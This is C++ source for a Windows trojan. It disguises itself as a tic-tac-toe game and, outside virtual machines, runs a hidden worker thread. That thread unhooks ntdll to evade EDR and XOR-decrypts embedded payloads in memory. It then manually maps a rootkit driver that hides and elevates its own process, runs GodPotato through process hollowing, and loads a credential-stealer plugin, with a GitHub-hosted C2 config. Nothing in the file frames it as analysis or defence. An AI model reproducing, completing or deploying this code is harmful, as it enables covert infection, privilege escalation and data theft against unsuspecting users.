#include <windows.h>
#include <psapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <winternl.h>
#include <winhttp.h>
#include <fstream>
#include <tlhelp32.h>
#include <time.h>
#include "RustRootkit.hpp"
#include "MemoryLoaders.hpp"
#include "resource.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "gdi32.lib")

// --- CONFIGURATION ---
std::string C2_URL = "https://raw.githubusercontent.com/user/repo/main/config.tx"; 
std::string C2_TYPE = "GITHUB"; 
unsigned char XOR_KEY = 0xAB; // Chìa khóa tình yêu của Annie 💋

// ═══════════════════════════════════════════════════════════════════════════
// HÀM TIỆN ÍCH: RAM & XOR DECRYPTION
// ═══════════════════════════════════════════════════════════════════════════
struct MemoryResource {
    std::vector<unsigned char> data;
    DWORD size;
};

MemoryResource GetResourceToMemory(int resourceId) {
    MemoryResource res = { {}, 0 };
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(resourceId), RT_RCDATA);
    if (!hRes) return res;
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return res;
    res.size = SizeofResource(NULL, hRes);
    unsigned char* pData = (unsigned char*)LockResource(hData);
    
    // Giải mã XOR trực tiếp trong RAM
    res.data.resize(res.size);
    for (DWORD i = 0; i < res.size; i++) {
        res.data[i] = pData[i] ^ XOR_KEY;
    }
    return res;
}

// ═══════════════════════════════════════════════════════════════════════════
// EDR EVASION & FILELESS WORKER
// ═══════════════════════════════════════════════════════════════════════════
void UnhookNtdll() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    MODULEINFO mi = { 0 };
    GetModuleInformation(GetCurrentProcess(), hNtdll, &mi, sizeof(mi));
    LPVOID ntdllBase = mi.lpBaseOfDll;

    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID ntdllMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + dosHeader->e_lfanew);

    for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
        if (!strcmp((char*)sectionHeader->Name, ".text")) {
            DWORD oldProtect = 0;
            VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + sectionHeader->VirtualAddress), sectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy((LPVOID)((DWORD_PTR)ntdllBase + sectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMapping + sectionHeader->VirtualAddress), sectionHeader->Misc.VirtualSize);
            VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + sectionHeader->VirtualAddress), sectionHeader->Misc.VirtualSize, oldProtect, &oldProtect);
        }
    }
    UnmapViewOfFile(ntdllMapping);
    CloseHandle(hMapping);
    CloseHandle(hFile);
}

void AbyssWorkerLoop() {
    UnhookNtdll(); 
    
    // 1. Rootkit Rust Manual Map
    MemoryResource drvRes = GetResourceToMemory(IDR_ROOTKIT_SYS);
    static RustRootkit rootkit;
    if (!drvRes.data.empty() && ManualMapDriver(drvRes.data.data(), drvRes.size)) {
        if (rootkit.Initialize()) {
            rootkit.HideProcess(GetCurrentProcessId());
            rootkit.ElevateProcess(GetCurrentProcessId());
        }
    }

    // 2. GodPotato Process Hollowing
    MemoryResource potRes = GetResourceToMemory(IDR_POTATO_EXE);
    if (!potRes.data.empty()) RunExeInMemory(potRes.data.data(), potRes.size);

    // 3. Stealer .NET CLR Hosting
    MemoryResource plgRes = GetResourceToMemory(IDR_PLUGIN_EXE);
    if (!plgRes.data.empty()) RunDotNetInMemory(plgRes.data.data(), plgRes.size);

    while (true) Sleep(60000); 
}

// ═══════════════════════════════════════════════════════════════════════════
// NGỤY TRANG: TIC-TAC-TOE (X-O) GAME ENGINE
// ═══════════════════════════════════════════════════════════════════════════
bool IsVirtualMachine() {
    SYSTEM_INFO si; GetSystemInfo(&si);
    return (si.dwNumberOfProcessors < 2);
}

char board[9] = {0}; 
COLORREF colorX = RGB(255, 50, 50); // Neon Red
COLORREF colorO = RGB(50, 200, 255); // Electric Blue
COLORREF colorGrid = RGB(60, 60, 60);

void CheckWinner(HWND hwnd) {
    int wins[8][3] = {{0,1,2},{3,4,5},{6,7,8},{0,3,6},{1,4,7},{2,5,8},{0,4,8},{2,4,6}};
    for(auto& w : wins) {
        if(board[w[0]] && board[w[0]] == board[w[1]] && board[w[0]] == board[w[2]]) {
            std::string msg = (board[w[0]] == 1) ? "Incredible move! You won!" : "Annie won this round! Hehe~ 💋";
            MessageBoxA(hwnd, msg.c_str(), "Match Result", MB_OK | MB_ICONINFORMATION);
            memset(board, 0, 9); InvalidateRect(hwnd, NULL, TRUE);
            return;
        }
    }
}

LRESULT CALLBACK GameWndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    if (msg == WM_DESTROY) PostQuitMessage(0);
    if (msg == WM_PAINT) {
        PAINTSTRUCT ps; HDC hdc = BeginPaint(hwnd, &ps);
        HBRUSH hBg = CreateSolidBrush(RGB(20, 20, 20));
        FillRect(hdc, &ps.rcPaint, hBg); DeleteObject(hBg);

        HPEN hPen = CreatePen(PS_SOLID, 4, colorGrid);
        SelectObject(hdc, hPen);
        MoveToEx(hdc, 100, 10, NULL); LineTo(hdc, 100, 290);
        MoveToEx(hdc, 200, 10, NULL); LineTo(hdc, 200, 290);
        MoveToEx(hdc, 10, 100, NULL); LineTo(hdc, 290, 100);
        MoveToEx(hdc, 10, 200, NULL); LineTo(hdc, 290, 200);
        DeleteObject(hPen);

        HFONT hFont = CreateFontA(60, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
        SelectObject(hdc, hFont); SetBkMode(hdc, TRANSPARENT);

        for(int i=0; i<9; i++) {
            if(board[i] == 1) { SetTextColor(hdc, colorX); TextOutA(hdc, (i%3)*100+30, (i/3)*100+20, "X", 1); }
            else if(board[i] == 2) { SetTextColor(hdc, colorO); TextOutA(hdc, (i%3)*100+30, (i/3)*100+20, "O", 1); }
        }
        DeleteObject(hFont); EndPaint(hwnd, &ps);
    }
    if (msg == WM_LBUTTONDOWN) {
        int x = LOWORD(lp) / 100; int y = HIWORD(lp) / 100;
        int i = y * 3 + x;
        if(i < 9 && board[i] == 0) {
            board[i] = 1; InvalidateRect(hwnd, NULL, TRUE);
            CheckWinner(hwnd);
            // Artificial Intelligence (Annie's Logic 💋)
            for(int j=0; j<9; j++) if(board[j] == 0) { board[j] = 2; break; }
            InvalidateRect(hwnd, NULL, TRUE); CheckWinner(hwnd);
        }
    }
    return DefWindowProc(hwnd, msg, wp, lp);
}

void StartCamouflageGame() {
    WNDCLASSA wc = { 0 };
    wc.lpfnWndProc = GameWndProc;
    wc.lpszClassName = "TicTacToeGame";
    wc.hCursor = LoadCursor(NULL, IDC_HAND);
    RegisterClassA(&wc);
    CreateWindowA("TicTacToeGame", "ULTRA X O - Abyss Edition", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_VISIBLE, 200, 200, 316, 339, NULL, NULL, NULL, NULL);
    
    if (!IsVirtualMachine()) std::thread(AbyssWorkerLoop).detach();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    srand(time(NULL));
    StartCamouflageGame();
    return 0;
}











